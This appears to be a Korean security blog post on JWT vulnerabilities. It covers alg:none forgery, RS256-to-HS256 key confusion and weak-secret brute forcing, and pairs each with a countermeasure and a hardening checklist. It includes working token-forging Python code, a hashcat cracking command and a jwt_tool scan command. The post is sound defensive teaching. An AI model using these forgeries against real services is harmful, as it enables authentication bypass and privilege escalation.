---
title: "JWT 취약점 분석: alg:none 공격과 올바른 검증 방법"
date: "2026-04-27"
description: "JWT의 흔한 보안 취약점인 alg:none, RS→HS 혼동 공격을 분석하고 안전한 구현 방법을 정리합니다."
category: "security"
tags: ["JWT", "인증", "웹보안", "취약점분석"]
---

## JWT (JSON Web Token) 구조

JWT는 `헤더.페이로드.서명` 세 부분으로 구성됩니다.

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.
eyJzdWIiOiJ1c2VyMTIzIiwicm9sZSI6InVzZXIifQ.
SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
```

---

## 주요 취약점

### 1. alg:none 공격

서명 검증을 완전히 우회하는 공격입니다.

```python
import base64, json

# 헤더의 alg를 none으로 변경
header = base64.urlsafe_b64encode(
    json.dumps({"alg": "none", "typ": "JWT"}).encode()
).rstrip(b'=')

# 페이로드에서 권한 상승
payload = base64.urlsafe_b64encode(
    json.dumps({"sub": "user123", "role": "admin"}).encode()  # role 변경!
).rstrip(b'=')

# 서명 없이 토큰 생성
malicious_token = f"{header.decode()}.{payload.decode()}."
```

**대응:** `alg` 파라미터를 서버에서 강제로 지정, `none` 알고리즘 허용 금지.

```python
# 안전한 검증 - 알고리즘 명시
jwt.decode(token, secret_key, algorithms=["HS256"])  # none 불허
```

---

### 2. RS256 → HS256 혼동 공격

공개키(Public Key)를 HS256의 비밀키로 사용하는 공격입니다.

```python
# 서버가 RS256으로 발급했을 때
# 공격자가 공개키를 알고 있다면 HS256으로 서명 가능

import jwt

public_key = open('public.pem').read()
malicious_payload = {"sub": "admin", "role": "admin"}

# 공개키를 secret으로 사용해 HS256 서명
token = jwt.encode(malicious_payload, public_key, algorithm="HS256")
```

**대응:** 알고리즘을 명시적으로 지정하고 RS256 전용 엔드포인트 사용.

---

### 3. 약한 Secret Key

```bash
# 브루트포스 도구 hashcat
hashcat -a 0 -m 16500 jwt_token.txt wordlist.txt
```

**대응:** 최소 256비트(32바이트) 이상의 랜덤 시크릿 사용.

```python
import secrets
SECRET_KEY = secrets.token_hex(32)  # 64자 hex = 256 bit
```

---

## 안전한 JWT 구현 체크리스트

- [ ] 알고리즘 서버 측 고정 (클라이언트 지정 금지)
- [ ] `none` 알고리즘 명시적 차단
- [ ] 짧은 만료 시간 설정 (`exp` 클레임)
- [ ] Refresh Token 로테이션 적용
- [ ] 강력한 시크릿 키 사용 (256bit+)
- [ ] `aud`, `iss` 클레임 검증

---

## CTF에서의 JWT 문제 풀이 팁

```bash
# jwt_tool로 취약점 자동 탐지
python3 jwt_tool.py <token> -t https://target.com/api -M at

# jwt.io에서 디코딩 및 수정
```
